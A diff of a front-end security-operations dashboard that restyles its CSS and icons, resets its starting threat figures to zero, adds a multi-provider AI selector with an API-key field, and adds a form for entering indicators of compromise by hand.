@@ -201,6 +201,8 @@ body::after {
   flex-shrink: 0;
   width: 16px;
   height: 16px;
+  min-width: 16px;
+  min-height: 16px;
   display: inline-block;
   vertical-align: middle;
 }
@@ -315,24 +317,10 @@ body::after {
   box-shadow: 0 0 12px rgba(0, 255, 156, 0.25);
 }
 
-.page-title {
-  font-size: 14px;
-  font-weight: 700;
-  color: var(--text-0);
-  white-space: nowrap;
-}
-.page-subtitle {
-  font-size: 10px;
-  color: var(--text-2);
-  white-space: nowrap;
-}
+.page-title { font-size: 14px; font-weight: 700; color: var(--text-0); white-space: nowrap; }
+.page-subtitle { font-size: 10px; color: var(--text-2); white-space: nowrap; }
 
-.topbar-right {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-  flex-shrink: 0;
-}
+.topbar-right { display: flex; align-items: center; gap: 10px; flex-shrink: 0; }
 .search-box {
   display: flex;
   align-items: center;
@@ -363,6 +351,7 @@ body::after {
   border-radius: 3px;
   color: var(--text-2);
 }
+@media (max-width: 900px) { .search-box { display: none; } }
 
 .content {
   flex: 1;
@@ -442,9 +431,7 @@ body::after {
   color: #000;
   box-shadow: 0 0 18px rgba(0, 255, 156, 0.3);
 }
-.btn-primary:hover:not(:disabled) {
-  box-shadow: 0 0 26px rgba(0, 255, 156, 0.55);
-}
+.btn-primary:hover:not(:disabled) { box-shadow: 0 0 26px rgba(0, 255, 156, 0.55); }
 .btn-danger { background: linear-gradient(135deg, var(--red), #C20038); color: #fff; }
 .btn-ghost { background: rgba(0, 255, 156, 0.04); border-color: var(--border); color: var(--text-1); }
 .btn-ghost:hover:not(:disabled) {
@@ -542,9 +529,7 @@ body::after {
   cursor: pointer;
   white-space: nowrap;
 }
-.term-chip:hover {
-  background: rgba(0, 255, 156, 0.2);
-}
+.term-chip:hover { background: rgba(0, 255, 156, 0.2); }
 
 .term-input-row {
   display: flex;
@@ -588,12 +573,7 @@ body::after {
   box-shadow: 0 0 15px rgba(0, 255, 156, 0.15);
   background: rgba(0, 0, 0, 0.9);
 }
-.textarea {
-  font-family: 'JetBrains Mono', monospace;
-  font-size: 12px;
-  line-height: 1.65;
-  resize: vertical;
-}
+.textarea { font-family: 'JetBrains Mono', monospace; font-size: 12px; line-height: 1.65; resize: vertical; }
 .select { cursor: pointer; }
 .select option { background: var(--bg-1); color: var(--text-0); }
 .field-label {
@@ -626,16 +606,8 @@ body::after {
 .badge-purple { background: rgba(183, 148, 246, 0.08); color: var(--purple); border-color: rgba(183, 148, 246, 0.35); }
 .badge-gray { background: rgba(139, 148, 158, 0.08); color: var(--text-1); border-color: var(--border); }
 
-.grid-2 {
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-  gap: 14px;
-}
-.grid-3 {
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
-  gap: 12px;
-}
+.grid-2 { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 14px; }
+.grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(230px, 1fr)); gap: 12px; }
 
 #radarCanvas { width: 240px; height: 240px; display: block; margin: 0 auto; }
 
@@ -752,16 +724,6 @@ body::after {
 .tab-btn.active { color: var(--green); background: rgba(0, 255, 156, 0.12); }
 
 .hidden { display: none !important; }
-.icon-wrap {
-  width: 32px; height: 32px;
-  border-radius: 7px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  background: rgba(0, 255, 156, 0.08);
-  border: 1px solid rgba(0, 255, 156, 0.2);
-  flex-shrink: 0;
-}
 .feed-item { display: flex; gap: 10px; padding: 10px 0; border-bottom: 1px dashed var(--border); }
 .feed-item:last-child { border-bottom: none; }
 .num { font-variant-numeric: tabular-nums; }
@@ -775,7 +737,7 @@ body::after {
 <div class="app">
   <div class="sidebar-overlay" id="sidebarOverlay" onclick="closeMobileMenu()"></div>
 
-  <!-- SIDEBAR -->
+  <!-- SIDEBAR NAVIGATION -->
   <aside class="sidebar" id="sidebar">
     <div class="brand">
       <div class="brand-logo">
@@ -790,63 +752,63 @@ body::after {
     <nav class="nav">
       <div class="section-label">Operations</div>
       <div class="nav-item active" data-view="dashboard" onclick="switchView('dashboard')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="7" height="9" x="3" y="3" rx="1"/><rect width="7" height="5" x="14" y="3" rx="1"/><rect width="7" height="9" x="14" y="12" rx="1"/><rect width="7" height="5" x="3" y="16" rx="1"/></svg>
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><rect width="7" height="9" x="3" y="3" rx="1"/><rect width="7" height="5" x="14" y="3" rx="1"/><rect width="7" height="9" x="14" y="12" rx="1"/><rect width="7" height="5" x="3" y="16" rx="1"/></svg>
         <span class="nav-label">Mission Control</span>
       </div>
       <div class="nav-item" data-view="terminal" onclick="switchView('terminal')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" x2="20" y1="19" y2="19"/></svg>
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" x2="20" y1="19" y2="19"/></svg>
         <span class="nav-label">Terminal Shell</span>
       </div>
       <div class="nav-item" data-view="analyzer" onclick="switchView('analyzer')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 7V5a2 2 0 0 1 2-2h2"/><path d="M17 3h2a2 2 0 0 1 2 2v2"/><path d="M21 17v2a2 2 0 0 1-2 2h-2"/><path d="M7 21H5a2 2 0 0 1-2-2v-2"/><line x1="7" x2="17" y1="12" y2="12"/></svg>
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 7V5a2 2 0 0 1 2-2h2"/><path d="M17 3h2a2 2 0 0 1 2 2v2"/><path d="M21 17v2a2 2 0 0 1-2 2h-2"/><path d="M7 21H5a2 2 0 0 1-2-2v-2"/><line x1="7" x2="17" y1="12" y2="12"/></svg>
         <span class="nav-label">Log Analyzer</span>
       </div>
       <div class="nav-item" data-view="recon" onclick="switchView('recon')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/><line x1="12" y1="2" x2="12" y2="22"/><line x1="2" y1="12" x2="22" y2="12"/></svg>
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/><line x1="12" y1="2" x2="12" y2="22"/><line x1="2" y1="12" x2="22" y2="12"/></svg>
         <span class="nav-label">Recon Scanner</span>
       </div>
 
       <div class="section-label">Toolkit</div>
       <div class="nav-item" data-view="payload" onclick="switchView('payload')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="13" r="9"/><path d="m19.5 9.5 1.8-1.8a2.4 2.4 0 0 0 0-3.4l-.1-.1a2.4 2.4 0 0 0-3.4 0l-1.8 1.8"/><path d="m22 2-1.5 1.5"/></svg>
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="13" r="9"/><path d="m19.5 9.5 1.8-1.8a2.4 2.4 0 0 0 0-3.4l-.1-.1a2.4 2.4 0 0 0-3.4 0l-1.8 1.8"/><path d="m22 2-1.5 1.5"/></svg>
         <span class="nav-label">Payload Builder</span>
       </div>
       <div class="nav-item" data-view="encoder" onclick="switchView('encoder')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="14" y="14" width="4" height="6" rx="2"/><rect x="6" y="4" width="4" height="6" rx="2"/><path d="M6 20h4"/><path d="M14 10h4"/><path d="M6 14h2v6"/><path d="M14 4h2v6"/></svg>
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><rect x="14" y="14" width="4" height="6" rx="2"/><rect x="6" y="4" width="4" height="6" rx="2"/><path d="M6 20h4"/><path d="M14 10h4"/><path d="M6 14h2v6"/><path d="M14 4h2v6"/></svg>
         <span class="nav-label">Encoder Lab</span>
       </div>
       <div class="nav-item" data-view="hash" onclick="switchView('hash')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="4" x2="20" y1="9" y2="9"/><line x1="4" x2="20" y1="15" y2="15"/><line x1="10" x2="8" y1="3" y2="21"/><line x1="16" x2="14" y1="3" y2="21"/></svg>
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><line x1="4" x2="20" y1="9" y2="9"/><line x1="4" x2="20" y1="15" y2="15"/><line x1="10" x2="8" y1="3" y2="21"/><line x1="16" x2="14" y1="3" y2="21"/></svg>
         <span class="nav-label">Hash Generator</span>
       </div>
 
       <div class="section-label">Threat Intel</div>
       <div class="nav-item" data-view="mitre" onclick="switchView('mitre')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="22" x2="18" y1="12" y2="12"/><line x1="6" x2="2" y1="12" y2="12"/><line x1="12" x2="12" y1="6" y2="2"/><line x1="12" x2="12" y1="22" y2="18"/></svg>
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="22" x2="18" y1="12" y2="12"/><line x1="6" x2="2" y1="12" y2="12"/><line x1="12" x2="12" y1="6" y2="2"/><line x1="12" x2="12" y1="22" y2="18"/></svg>
         <span class="nav-label">MITRE ATT&CK</span>
         <span class="nav-badge" id="navMitreBadge">2</span>
       </div>
       <div class="nav-item" data-view="ioc" onclick="switchView('ioc')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 10a2 2 0 0 0-2 2c0 1.02-.1 2.51-.26 4"/><path d="M14 13.12c0 2.38 0 6.38-1 8.88"/><path d="M2 12a10 10 0 0 1 18-6"/><path d="M5 19.5C5.5 18 6 15 6 12a6 6 0 0 1 .34-2"/></svg>
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 10a2 2 0 0 0-2 2c0 1.02-.1 2.51-.26 4"/><path d="M14 13.12c0 2.38 0 6.38-1 8.88"/><path d="M2 12a10 10 0 0 1 18-6"/><path d="M5 19.5C5.5 18 6 15 6 12a6 6 0 0 1 .34-2"/></svg>
         <span class="nav-label">IoC Vault</span>
         <span class="nav-badge" id="navIocBadge">3</span>
       </div>
       <div class="nav-item" data-view="containment" onclick="switchView('containment')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m9 12 2 2 4-4"/></svg>
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m9 12 2 2 4-4"/></svg>
         <span class="nav-label">Containment</span>
       </div>
       <div class="nav-item" data-view="report" onclick="switchView('report')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M10 9H8"/><path d="M16 13H8"/><path d="M16 17H8"/></svg>
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/><path d="M10 9H8"/><path d="M16 13H8"/><path d="M16 17H8"/></svg>
         <span class="nav-label">Incident Report</span>
       </div>
 
       <div class="section-label">System</div>
       <div class="nav-item" data-view="export" onclick="switchView('export')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" x2="12" y1="15" y2="3"/></svg>
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" x2="12" y1="15" y2="3"/></svg>
         <span class="nav-label">STIX 2.1 Export</span>
       </div>
       <div class="nav-item" data-view="settings" onclick="switchView('settings')">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
         <span class="nav-label">Settings</span>
       </div>
     </nav>
@@ -859,7 +821,7 @@ body::after {
     </div>
   </aside>
 
-  <!-- MAIN -->
+  <!-- MAIN VIEWPORT -->
   <main class="main">
     <div class="topbar">
       <div class="topbar-left">
@@ -895,12 +857,12 @@ body::after {
           </div>
           <div class="stat">
             <div class="stat-label">Triaged Incidents</div>
-            <div class="stat-value accent-cyan" id="statAnalyses">1</div>
+            <div class="stat-value accent-cyan" id="statAnalyses">0</div>
             <div class="stat-meta">Total events processed</div>
           </div>
           <div class="stat">
             <div class="stat-label">Max Risk Level</div>
-            <div class="stat-value accent-red" id="statScore">88</div>
+            <div class="stat-value accent-green" id="statScore">00</div>
             <div class="stat-meta">Current composite score</div>
           </div>
           <div class="stat">
@@ -917,7 +879,7 @@ body::after {
                 <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/><line x1="12" y1="2" x2="12" y2="22"/><line x1="2" y1="12" x2="22" y2="12"/></svg>
                 Threat Vector Radar
               </div>
-              <span class="badge badge-red" id="radarStatus">CRITICAL ALERT</span>
+              <span class="badge badge-green" id="radarStatus">STANDBY (0 THREATS)</span>
             </div>
             <div class="panel-body" style="padding:16px;text-align:center;">
               <div style="position:relative;width:240px;height:240px;margin:0 auto;">
@@ -925,7 +887,7 @@ body::after {
                 <div style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;pointer-events:none;">
                   <div style="text-align:center;">
                     <div style="font-size:9px;color:var(--text-2);letter-spacing:1px;">THREAT</div>
-                    <div class="num" id="radarScore" style="font-size:28px;font-weight:900;color:var(--red);line-height:1;">88</div>
+                    <div class="num" id="radarScore" style="font-size:28px;font-weight:900;color:var(--green);line-height:1;">00</div>
                     <div style="font-size:9px;color:var(--text-2);letter-spacing:1px;margin-top:2px;">INDEX</div>
                   </div>
                 </div>
@@ -996,7 +958,7 @@ body::after {
 
             <div class="term-input-row" onclick="focusTerminalInput()">
               <span class="term-prompt">secops@sentinel:~#</span>
-              <input type="text" class="term-input" id="termInput" autocomplete="off" spellcheck="false" placeholder="Click here or anywhere in terminal to type..." />
+              <input type="text" class="term-input" id="termInput" autocomplete="off" spellcheck="false" placeholder="Type here..." />
             </div>
           </div>
         </div>
@@ -1014,7 +976,7 @@ body::after {
               </div>
             </div>
             <div class="panel-body">
-              <textarea id="logStream" class="textarea" rows="10" placeholder="# Paste system, auth, firewall, or web server logs here..."></textarea>
+              <textarea id="logStream" class="textarea" rows="10" placeholder="# Paste logs here..."></textarea>
               <div style="display:flex;justify-content:space-between;margin-top:6px;font-size:10.5px;color:var(--text-2);">
                 <span id="byteCount">0 bytes</span>
                 <span>Press <strong style="color:var(--green);">CTRL+ENTER</strong> to analyze</span>
@@ -1024,24 +986,35 @@ body::after {
 
           <div class="panel">
             <div class="panel-header">
-              <div class="panel-title">AI Engine & Ingestion</div>
-              <span class="badge badge-green">HYBRID MODE</span>
+              <div class="panel-title">AI Engine Hub</div>
+              <span class="badge badge-green" id="activeProviderBadge">HEURISTIC (FREE)</span>
             </div>
             <div class="panel-body">
+              <div class="field-row">
+                <label class="field-label">Select Active AI Provider</label>
+                <select class="select" id="aiProviderSelect" onchange="switchProvider(this.value)">
+                  <option value="heuristic">Free Local Heuristic Core (Offline, 0 latency)</option>
+                  <option value="gemini">Google Gemini 1.5 Flash (Tier-3 SOC reasoning)</option>
+                  <option value="groq">Groq Cloud (Free Tier - Llama 3.3 70B)</option>
+                  <option value="openrouter">OpenRouter (Free Tier / Universal models)</option>
+                  <option value="mistral">Mistral AI (Codestral / Mistral Small)</option>
+                  <option value="cohere">Cohere (Command-R)</option>
+                  <option value="openai">OpenAI (GPT-4o / GPT-4o-mini)</option>
+                  <option value="anthropic">Anthropic (Claude 3.5 Sonnet)</option>
+                </select>
+              </div>
+
+              <div class="field-row" id="apiKeyContainer">
+                <label class="field-label" id="apiKeyLabel">API Key</label>
+                <input type="password" id="apiKeyInput" class="input" placeholder="Leave empty for local free heuristic engine" />
+              </div>
+
               <div class="dropzone" onclick="document.getElementById('fileInput').click()">
-                <div style="font-size:12.5px;font-weight:700;">Select or Drop Log Artifact</div>
+                <div style="font-size:12.5px;font-weight:700;">Drop Log File or Click to Upload</div>
                 <div style="font-size:10.5px;color:var(--text-2);">Supports .log, .txt, .json, .csv</div>
                 <div id="uploadFileName" style="font-size:11px;color:var(--green);margin-top:8px;"></div>
               </div>
               <input type="file" id="fileInput" hidden accept=".log,.txt,.json,.csv,text/*" />
-
-              <div style="margin-top:12px;">
-                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
-                  <label class="field-label" style="margin:0;">Gemini API Key (For Unstructured Zero-Day Logs)</label>
-                  <span style="font-size:9.5px;color:var(--cyan);">Free Heuristic Active by default</span>
-                </div>
-                <input type="password" id="apiKeyInput" class="input" placeholder="AIzaSy••• (optional: gives 100% LLM reasoning)" />
-              </div>
 
               <button class="btn btn-primary" style="width:100%;margin-top:12px;" onclick="runAnalysis()" id="analyzeBtn">
                 Execute Autonomous Triage
@@ -1092,7 +1065,7 @@ body::after {
               </div>
               <div>
                 <label class="field-label">Live Scanner Output</label>
-                <div class="code-out" id="reconOutput" style="min-height:220px;">$ recon scanner initialized. ready...</div>
+                <div class="code-out" id="reconOutput" style="min-height:220px;">$ recon scanner ready...</div>
               </div>
             </div>
           </div>
@@ -1182,12 +1155,12 @@ body::after {
         <div class="panel">
           <div class="panel-header">
             <div class="panel-title">Cryptographic Hash Generator</div>
-            <span class="badge badge-green">100% MATHEMATICAL WEBCRYPTO</span>
+            <span class="badge badge-green">WEBCRYPTO NATIVE</span>
           </div>
           <div class="panel-body">
             <div class="field-row">
               <label class="field-label">Target Text or File Digest</label>
-              <textarea class="textarea" id="hashInput" rows="3" placeholder="Enter input string to compute exact hashes..."></textarea>
+              <textarea class="textarea" id="hashInput" rows="3" placeholder="Enter string..."></textarea>
             </div>
             <button class="btn btn-primary" style="width:100%;margin-bottom:14px;" onclick="generateHashes()">
               Calculate Hashes
@@ -1214,6 +1187,7 @@ body::after {
           <div class="panel-header">
             <div class="panel-title">Indicators of Compromise (IoC) Vault</div>
             <div style="display:flex;gap:6px;">
+              <button class="btn btn-primary btn-sm" onclick="openAddIocModal()">+ Add IoC</button>
               <button class="btn btn-ghost btn-sm" onclick="copyAllIocs()">Copy All</button>
               <button class="btn btn-ghost btn-sm" onclick="exportIocsCSV()">Export CSV</button>
             </div>
@@ -1281,14 +1255,29 @@ body::after {
       <section id="view-settings" class="view hidden">
         <div class="panel">
           <div class="panel-header">
-            <div class="panel-title">Platform Configuration</div>
+            <div class="panel-title">Multi-AI & Engine Configuration</div>
           </div>
           <div class="panel-body">
             <div class="field-row">
-              <label class="field-label">Persistent Google Gemini API Key</label>
-              <input type="password" id="persistKey" class="input" placeholder="AIzaSy••• (stored in localStorage)" />
-              <div style="font-size:10px;color:var(--text-2);margin-top:4px;">When set, zero-day unknown logs are submitted to Google Gemini for deep SOC analysis. Leave empty to use the 100% free heuristic engine.</div>
+              <label class="field-label">Active AI Model Provider</label>
+              <select class="select" id="settingsProviderSelect" onchange="switchProvider(this.value)">
+                <option value="heuristic">Free Local Heuristic Core (Offline)</option>
+                <option value="gemini">Google Gemini (Gemini 1.5 Flash)</option>
+                <option value="groq">Groq (Llama 3.3 70B - Free API)</option>
+                <option value="openrouter">OpenRouter (Free Universal Models)</option>
+                <option value="mistral">Mistral AI (Codestral / Small)</option>
+                <option value="cohere">Cohere (Command-R)</option>
+                <option value="openai">OpenAI (GPT-4o)</option>
+                <option value="anthropic">Anthropic (Claude 3.5 Sonnet)</option>
+              </select>
             </div>
+
+            <div class="field-row">
+              <label class="field-label">API Key for Selected Provider</label>
+              <input type="password" id="persistKey" class="input" placeholder="Stored securely in browser localStorage" />
+              <div style="font-size:10px;color:var(--text-2);margin-top:4px;">Free Heuristic Core runs locally without any API key. For zero-day logs, add any provider key.</div>
+            </div>
+
             <div class="field-row">
               <label class="field-label">Matrix Rain Background Effect</label>
               <select class="select" id="matrixToggle" onchange="toggleMatrix(this.value)">
@@ -1296,9 +1285,10 @@ body::after {
                 <option value="off">Disabled</option>
               </select>
             </div>
+
             <div style="display:flex;gap:8px;">
               <button class="btn btn-primary" onclick="saveSettings()">Save Configuration</button>
-              <button class="btn btn-danger" onclick="resetSettings()">Reset to Factory</button>
+              <button class="btn btn-danger" onclick="resetSettings()">Reset All</button>
             </div>
           </div>
         </div>
@@ -1306,6 +1296,37 @@ body::after {
 
     </div>
   </main>
+</div>
+
+<!-- MANUAL IoC MODAL -->
+<div class="modal-bg hidden" id="addIocModal">
+  <div class="modal" style="max-width:500px;">
+    <div class="panel-header">
+      <div class="panel-title">Add Indicator of Compromise</div>
+      <button class="btn btn-ghost btn-sm" onclick="closeAddIocModal()">Cancel</button>
+    </div>
+    <div class="panel-body">
+      <div class="field-row">
+        <label class="field-label">IoC Type</label>
+        <select class="select" id="manualIocType">
+          <option value="ip">IPv4 Address</option>
+          <option value="domain">Domain / Hostname</option>
+          <option value="hash">File Hash (MD5 / SHA-256)</option>
+          <option value="cve">CVE ID</option>
+          <option value="path">File / Directory Path</option>
+        </select>
+      </div>
+      <div class="field-row">
+        <label class="field-label">Value</label>
+        <input type="text" class="input" id="manualIocValue" placeholder="e.g. 198.51.100.42 or mal_binary.exe" />
+      </div>
+      <div class="field-row">
+        <label class="field-label">Context / Threat Description</label>
+        <input type="text" class="input" id="manualIocContext" placeholder="e.g. Detected during manual threat hunt" />
+      </div>
+      <button class="btn btn-primary" style="width:100%;" onclick="submitManualIoc()">Add to Vault</button>
+    </div>
+  </div>
 </div>
 
 <!-- FORENSIC HEX MODAL -->
@@ -1352,10 +1373,11 @@ const INITIAL_BASELINE_SESSION = {
 
 const STATE = {
   view: 'dashboard',
-  lastReport: INITIAL_BASELINE_SESSION,
-  analyses: 1,
+  lastReport: null,
+  analyses: 0,
   commands: 0,
-  threatScore: 88,
+  threatScore: 0,
+  activeProvider: 'heuristic',
   containmentTab: 'iptables',
   exportTab: 'stix',
   killChart: null
@@ -1400,66 +1422,52 @@ const STATE = {
 })();
 
 /* ============================================================
-   RADAR SUBSYSTEM (NORMALIZED DRAWING)
+   RADAR SUBSYSTEM (100% RELIABLE)
 ============================================================ */
 const Radar = {
   canvas: null,
   ctx: null,
   animId: null,
   angle: 0,
-  score: 88,
+  score: 0,
   blips: [],
 
   init: function () {
     this.canvas = document.getElementById('radarCanvas');
     if (!this.canvas) return;
     this.ctx = this.canvas.getContext('2d');
-    this.spawnBlips();
+    this.canvas.width = 240;
+    this.canvas.height = 240;
     if (!this.animId) this.loop();
-  },
-
-  spawnBlips: function () {
-    this.blips = [];
-    const count = 7;
-    for (let i = 0; i < count; i++) {
-      this.blips.push({
-        dist: 0.25 + Math.random() * 0.65,
-        ang: Math.random() * Math.PI * 2,
-        hot: Math.random() < 0.6,
-        speed: 1.5 + Math.random() * 2
-      });
-    }
   },
 
   setScore: function (s) {
     this.score = Math.max(0, Math.min(100, Number(s) || 0));
-    this.spawnBlips();
   },
 
   loop: function () {
     if (!this.ctx) return;
     const ctx = this.ctx;
-    const size = 240;
     const cx = 120;
     const cy = 120;
-    const maxR = 108;
+    const maxR = 105;
 
-    ctx.clearRect(0, 0, size, size);
+    ctx.clearRect(0, 0, 240, 240);
 
     // Concentric Rings
-    ctx.lineWidth = 1;
     for (let i = 1; i <= 4; i++) {
       ctx.beginPath();
       ctx.arc(cx, cy, (maxR / 4) * i, 0, Math.PI * 2);
-      ctx.strokeStyle = i === 4 ? 'rgba(0, 255, 156, 0.45)' : 'rgba(0, 255, 156, 0.18)';
+      ctx.strokeStyle = (i === 4) ? 'rgba(0, 255, 156, 0.4)' : 'rgba(0, 255, 156, 0.15)';
+      ctx.lineWidth = 1;
       ctx.stroke();
     }
 
     // Crosshairs
-    ctx.strokeStyle = 'rgba(0, 255, 156, 0.15)';
     ctx.beginPath();
     ctx.moveTo(cx - maxR, cy); ctx.lineTo(cx + maxR, cy);
     ctx.moveTo(cx, cy - maxR); ctx.lineTo(cx, cy + maxR);
+    ctx.strokeStyle = 'rgba(0, 255, 156, 0.15)';
     ctx.stroke();
 
     // Rotating Sweep
@@ -1468,7 +1476,7 @@ const Radar = {
     ctx.rotate(this.angle);
 
     const sweepGrad = ctx.createRadialGradient(0, 0, 0, 0, 0, maxR);
-    sweepGrad.addColorStop(0, 'rgba(0, 255, 156, 0.4)');
+    sweepGrad.addColorStop(0, 'rgba(0, 255, 156, 0.35)');
     sweepGrad.addColorStop(1, 'rgba(0, 255, 156, 0)');
 
     ctx.beginPath();
@@ -1493,13 +1501,16 @@ const Radar = {
       const bx = cx + Math.cos(b.ang) * (b.dist * maxR);
       const by = cy + Math.sin(b.ang) * (b.dist * maxR);
       const pulse = (Math.sin(now * b.speed) + 1) / 2;
-      const isRed = b.hot || this.score >= 70;
-      const col = isRed ? '#FF2E63' : (this.score >= 40 ? '#FFB627' : '#00FF9C');
+      const isRed = b.hot || this.score >= 75;
+      const col = isRed ? '#FF2E63' : (this.score >= 50 ? '#FFB627' : '#00FF9C');
 
       ctx.beginPath();
-      ctx.arc(bx, by, 3 * (0.8 + 0.4 * pulse), 0, Math.PI * 2);
+      ctx.arc(bx, by, 3 + pulse * 2, 0, Math.PI * 2);
       ctx.fillStyle = col;
+      ctx.shadowColor = col;
+      ctx.shadowBlur = 8;
       ctx.fill();
+      ctx.shadowBlur = 0;
     });
 
